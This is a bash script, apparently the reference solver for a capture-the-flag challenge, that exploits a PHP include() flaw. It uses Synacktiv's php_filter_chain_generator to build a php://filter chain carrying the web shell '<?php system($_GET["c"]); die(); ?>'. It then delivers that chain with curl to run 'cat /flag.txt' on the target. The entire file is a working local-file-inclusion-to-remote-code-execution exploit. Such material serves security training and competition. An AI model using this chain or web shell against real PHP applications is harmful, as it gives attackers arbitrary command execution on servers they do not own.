#!/usr/bin/env bash
# 03 · filter-chain reference solver
# Uses Synacktiv's php_filter_chain_generator to synthesize a PHP payload that
# gets included and executed, then reads the flag.
#
# Usage: ./solve.sh http://TARGET:PORT
set -euo pipefail
BASE="${1:?usage: solve.sh http://host:port}"
HERE="$(cd "$(dirname "$0")" && pwd)"
GEN="${HERE}/php_filter_chain_generator.py"

if [[ ! -f "$GEN" && -f "${HERE}/pfcg/php_filter_chain_generator.py" ]]; then
  GEN="${HERE}/pfcg/php_filter_chain_generator.py"
fi

if [[ ! -f "$GEN" ]]; then
  echo "[*] Fetching php_filter_chain_generator..."
  git clone --depth 1 https://github.com/synacktiv/php_filter_chain_generator "${HERE}/pfcg" >/dev/null 2>&1
  GEN="${HERE}/pfcg/php_filter_chain_generator.py"
fi

# Payload: a one-shot command runner. Included at the start of the file content;
# trailing filter-chain noise is emitted as harmless output after die().
PAYLOAD='<?php system($_GET["c"]); die(); ?>'

echo "[*] Generating filter chain..."
CHAIN="$(python3 "$GEN" --chain "$PAYLOAD" 2>/dev/null | grep -oE 'php://filter/[^\"]+' | head -n1)"
if [[ -z "${CHAIN:-}" ]]; then
  echo "[!] Could not generate chain. Run the generator manually:"
  echo "    python3 $GEN --chain '$PAYLOAD'"
  exit 1
fi

echo "[*] Delivering chain to include() sink..."
curl -s -G "${BASE}/" \
  --data-urlencode "page=${CHAIN}" \
  --data-urlencode "c=cat /flag.txt" \
  | grep -oE 'SecurinetsENIT\{[^}]+\}' | head -n1
